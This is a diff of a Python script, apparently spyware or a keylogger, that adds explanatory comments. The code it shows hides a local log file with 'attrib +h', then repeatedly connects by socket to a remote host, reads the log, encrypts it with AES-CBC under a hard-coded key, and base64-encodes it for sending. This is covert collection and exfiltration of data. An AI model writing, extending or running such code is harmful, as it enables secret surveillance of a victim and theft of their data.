@@ -11,11 +11,13 @@ import time
 
 filename = 'log.txt'
 
+#Ensure that there is no file called log.txt
 try:
     os.remove(filename)
 except:
     logging.basicConfig(filename=filename,level=logging.DEBUG, filemode= 'w', format= '%(asctime)s - %(message)s', datefmt = '%d-%b-%y %H:%M:%S')
-#set the file log.txt to become hidden, print error results in the log.
+
+#Set the file log.txt to become hidden, print error results in the log.
 try:
     os.system(f'attrib +h {filename}')
     logging.info("file set as hidden.")
@@ -51,6 +53,7 @@ logging.shutdown()
 
 #Sender Socket
 
+#Uses CBC Cipher, key is custom
 key = b"Key For Testing."
 cipher = AES.new(key, AES.MODE_CBC)
 
@@ -65,9 +68,11 @@ while True:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((HOST, PORT))
 
+        #Read in the file log.txt as bytes
         with open(filename, "rb") as s:
             data = s.read()
 
+        #Encrypt log.txt byte data
         ciphertext_bytes = cipher.encrypt(pad(data, AES.block_size))
         iv = b64encode(cipher.iv)
         ciphertext = b64encode(ciphertext_bytes)
